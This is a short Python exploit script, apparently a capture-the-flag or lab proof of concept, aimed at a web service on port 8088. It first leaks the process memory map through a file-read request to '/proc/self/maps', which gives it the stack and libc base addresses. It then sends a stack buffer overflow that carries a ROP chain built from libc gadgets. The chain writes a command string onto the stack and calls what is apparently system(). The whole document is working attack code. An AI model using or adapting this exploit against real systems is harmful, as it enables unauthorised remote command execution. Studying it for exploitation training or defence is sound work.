import requests
import sys
import os
from pwn import *

#7f6d180cb000

def getBaseAddr():
    filename = "/proc/self/maps"
    data = {
        "a":filename,
    }
    url = "http://myip:8088"
    r = requests.post(url, data=data)
    contents = r.text.split("\n")
    
    for content in contents:
        if "[stack]" in content:
            stackBase = int(content.split("-")[0],16)
            break
    
    for content in contents:
        if "libc-2.27.so" in content:
            libcBase = int( content.split("-")[0],16 )
            break
    
    return stackBase,libcBase
     
stackBase , libc_addr = getBaseAddr()

log.success("Find stackBase addr is {}, libcBase addr is {}".format(stackBase,libc_addr))

# libc_addr=0x00007ffff70f3000

pop_rdi=libc_addr+0x02155f     # 0x7ffff711455f  pop rdi; ret 
mov_rdx_rdi=libc_addr+0x1011aa # 0x7ffff71f41aa   mov    QWORD PTR [rdx],rdi ; ret
pop_rdx=libc_addr+0x1b96       #0x7ffff70f4b96   pop    rdx ; ret 

shell_addr = stackBase # stack base address 
s="echo kirin > /tmp/123\x00"
pop4_ret=libc_addr+0x000000000002219e  # 0x7ffff711519e ;pop    r13 ; pop    r14 ;pop    r15;pop    rbp; ret

payload=p64(pop_rdx)*10+p64(pop4_ret)+p64(0)*4 + p64(pop4_ret)+p64(0)*4

for i in range(len(s)//8+1):
    payload+=p64(pop_rdx)
    payload+=p64(shell_addr+i*8)
    payload+=p64(pop_rdi)
    payload+= bytes(s[i*8:i*8+8].ljust(8,"\x00"),encoding="latin-1")
    payload+=p64(mov_rdx_rdi)

payload+=p64(pop_rdi)+p64(shell_addr)
payload+=p64(libc_addr+0x04f440 )

global INITIAL
# filename="/proc/self/maps"

filename = bytes("a"*0x88,encoding="latin-1") + payload
data = {
    "a":filename,
}

url = "http://myip:8088"
r = requests.post(url, data=data)
print(r.content)

# hex(0x00007ffff70f3000+0x1b96)

# http://blog.binpang.me/2019/07/12/stack-alignment/